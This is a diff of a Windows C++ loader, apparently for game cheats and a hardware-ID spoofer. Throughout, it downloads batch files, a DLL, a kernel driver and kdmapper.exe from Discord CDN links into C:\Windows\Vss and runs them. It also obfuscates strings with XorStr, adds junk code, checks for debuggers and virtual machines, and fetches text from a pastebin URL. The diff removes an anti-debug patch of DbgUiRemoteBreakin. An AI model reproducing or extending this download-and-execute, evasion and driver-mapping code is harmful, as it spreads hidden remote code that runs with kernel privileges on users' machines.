@@ -1,17 +1,20 @@
 #include <iostream>
-#include "xorstr.hpp"
+#include "Headers/xorstr.hpp"
 #include <string>
 #include <windows.h>
 #include <Urlmon.h>
-#include "junk-code.h"
+#include "Headers/junk-code.h"
 #include <Wininet.h>
 #include <stdlib.h>
 #include <vector>
 #include <tchar.h>
-#include "color.hpp"
-
+#include "Headers/color.hpp"
+#include "Headers/json.hpp"
+#include <fstream>
+#include "Headers/value.h"
+#include <stringapiset.h>
 #pragma comment(lib, "urlmon.lib")
-
+#pragma comment(lib,"Wininet.lib") 
 using namespace junkcode;
 
 
@@ -20,10 +23,10 @@ void apex()
 
     akfuxnl();
     std::string apex = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/880114575800954941/apex.bat"));
-    std::string apexpath = "C:\\Windows\Vss\\Apex.bat";
+    std::string apexpath = "C:\\Windows\\Vss\\Apex.bat";
     URLDownloadToFileA(NULL, apex.c_str(), apexpath.c_str(), 0, NULL);
-    system("cd C:\\Windows\Vss\\");
-    system("Start C:\\Windows\Vss\\Apex.bat");
+    system("cd C:\\Windows\\Vss\\");
+    system("Start C:\\Windows\\Vss\\Apex.bat");
 
 
 }
@@ -34,8 +37,8 @@ void gta()
     std::string gta = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/880114574483918858/gta.bat"));
     std::string gtapath = "C:\\Windows\Vss\\gta.bat";
     URLDownloadToFileA(NULL, gta.c_str(), gtapath.c_str(), 0, NULL);
-    system("cd C:\\Windows\Vss\\");
-    system("Start C:\\Windows\Vss\\gta.bat");
+    system("cd C:\\Windows\\Vss\\");
+    system("Start C:\\Windows\\Vss\\gta.bat");
 
 }
 void fortnite()
@@ -43,20 +46,20 @@ void fortnite()
 
     akfuxnl();
     std::string fortnite = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/880114573007527946/Fortnite.bat"));
-    std::string fortnitepath = "C:\\Windows\Vss\\Fortnite.bat";
+    std::string fortnitepath = "C:\\Windows\\Vss\\Fortnite.bat";
     URLDownloadToFileA(NULL, fortnite.c_str(), fortnitepath.c_str(), 0, NULL);
-    system("cd C:\\Windows\Vss\\");
-    system("Start C:\\Windows\Vss\\Fortnite.bat");
+    system("cd C:\\Windows\\Vss\\");
+    system("Start C:\\Windows\\Vss\\Fortnite.bat");
 }
 void fishingplanet()
 {
 
     akfuxnl();
     std::string fishingplanet = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/880114571648593931/fishing-planet.bat"));
-    std::string fishingplanetpath = "C:\\Windows\Vss\\Fishing-planet.bat";
+    std::string fishingplanetpath = "C:\\Windows\\Vss\\Fishing-planet.bat";
     URLDownloadToFileA(NULL, fishingplanet.c_str(), fishingplanetpath.c_str(), 0, NULL);
     system("cd C:\\Windows\Vss\\");
-    system("Start C:\\Windows\Vss\\Fishing-planet.bat");
+    system("Start C:\\Windows\\Vss\\Fishing-planet.bat");
 
 }
 void cod()
@@ -64,10 +67,10 @@ void cod()
 
     akfuxnl();
     std::string cod = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/880114570369318962/Cold-Ware.bat"));
-    std::string codpath = "C:\\Windows\Vss\\Cold-Ware.bat";
+    std::string codpath = "C:\\Windows\\Vss\\Cold-Ware.bat";
     URLDownloadToFileA(NULL, cod.c_str(), codpath.c_str(), 0, NULL);
-    system("cd C:\\Windows\Vss\ ");
-    system("Start C:\\Windows\Vss\Cold-Ware.bat");
+    system("cd C:\\Windows\\Vss\\");
+    system("Start C:\\Windows\\Vss\Cold-Ware.bat");
 
 
 }
@@ -76,7 +79,7 @@ void demondll()
 {
     akfuxnl();
     std::string dll = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/881164876037361684/Demon_DLL.dll"));
-    std::string dllpath = "C:\\Windows\Vss\\demon.dll";
+    std::string dllpath = "C:\\Windows\\Vss\\demon.dll";
     URLDownloadToFileA(NULL, dll.c_str(), dllpath.c_str(), 0, NULL);
 
 
@@ -345,14 +348,14 @@ void spoofer()
 
     akfuxnl();
     string spoofer = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/881227464498630677/NewWoof.sys"));
-    string spooferpath = "C:\\Windows\Vss\woof.sys"; 
+    string spooferpath = "C:\\Windows\\Vss\\woof.sys"; 
     URLDownloadToFileA(NULL, spoofer.c_str(), spooferpath.c_str(), 0, NULL);
 
     string mapper = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/879745681294786600/kdmapper.exe"));
-    string mapperpath = "C:\\Windows\Vss\mapper.exe";
+    string mapperpath = "C:\\Windows\\Vss\\mapper.exe";
     URLDownloadToFileA(NULL, mapper.c_str(), mapperpath.c_str(), 0, NULL);
-    system("cd C:\\Windows\Vss\\");
-    system("C:\\Windows\Vss\\mapper.exe C:\\Windows\Vss\\woof.sys");
+    system("cd C:\\Windows\\Vss\\");
+    system("C:\\Windows\\Vss\\mapper.exe C:\\Windows\\Vss\\woof.sys");
     Sleep(2000);
     deleter();
     Sleep(2000);
@@ -369,7 +372,40 @@ void setcolor(unsigned short color)
     HANDLE hcon = GetStdHandle(STD_OUTPUT_HANDLE);
     SetConsoleTextAttribute(hcon, color);
 }
+string replaceAll(string subject, const string& search,
+    const string& replace) {
+    size_t pos = 0;
+    while ((pos = subject.find(search, pos)) != string::npos) {
+        subject.replace(pos, search.length(), replace);
+        pos += replace.length();
+    }
+    return subject;
+}
 
+string DownloadString(string URL) {
+    HINTERNET interwebs = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
+    HINTERNET urlFile;
+    string rtn;
+    if (interwebs) {
+        urlFile = InternetOpenUrlA(interwebs, URL.c_str(), NULL, NULL, NULL, NULL);
+        if (urlFile) {
+            char buffer[2000];
+            DWORD bytesRead;
+            do {
+                InternetReadFile(urlFile, buffer, 2000, &bytesRead);
+                rtn.append(buffer, bytesRead);
+                memset(buffer, 0, 2000);
+            } while (bytesRead);
+            InternetCloseHandle(interwebs);
+            InternetCloseHandle(urlFile);
+            string p = replaceAll(rtn, "|n", "\r\n");
+            return p;
+        }
+    }
+    InternetCloseHandle(interwebs);
+    string p = replaceAll(rtn, "|n", "\r\n");
+    return p;
+}
 vector<string> serial;
 void loadserial()
 {
@@ -377,15 +413,18 @@ void loadserial()
     serial.push_back(XorStr("384604182").c_str());
 }
 
-
 void mainbot()
 {
-    driverdetect();
+ 
     TCHAR volumeName[MAX_PATH + 1] = { 0 };
     TCHAR fileSystemName[MAX_PATH + 1] = { 0 };
     DWORD serialNumber = 0;
     DWORD maxComponentLen = 0;
     DWORD fileSystemFlags = 0;
+    string lol = DownloadString("https://pastebin.com/raw/HzjsUxNu");
+    driverdetect();
+
+
     if (GetVolumeInformation(_T("C:\\"), volumeName, ARRAYSIZE(volumeName), &serialNumber, &maxComponentLen, &fileSystemFlags, fileSystemName, ARRAYSIZE(fileSystemName)));
     while (true)
     {
@@ -420,6 +459,7 @@ void mainbot()
             fortnite();
             spoofer();
         }
+        
         else
         {
             system(XorStr("cls").c_str());
@@ -434,20 +474,10 @@ void mainbot()
 
 
 }
-__declspec(naked) void AntiAttach() {
-    __asm {
-        jmp ExitProcess
-    }
-}
+
 
 int main()
 {
-    HANDLE hProcess = GetCurrentProcess();
-
-    HMODULE hMod = GetModuleHandleW(L"ntdll.dll");
-    FARPROC func_DbgUiRemoteBreakin = GetProcAddress(hMod, "DbgUiRemoteBreakin");
-
-    WriteProcessMemory(hProcess, func_DbgUiRemoteBreakin, AntiAttach, 6, NULL);
 
     LPCWSTR windowName = L"x32dbg"; 
     LPCWSTR vmname = L"VMware Workstation";
@@ -490,6 +520,7 @@ int main()
     }
     else
     {
+        
         driverdetect();
         loadserial();
         mainbot();
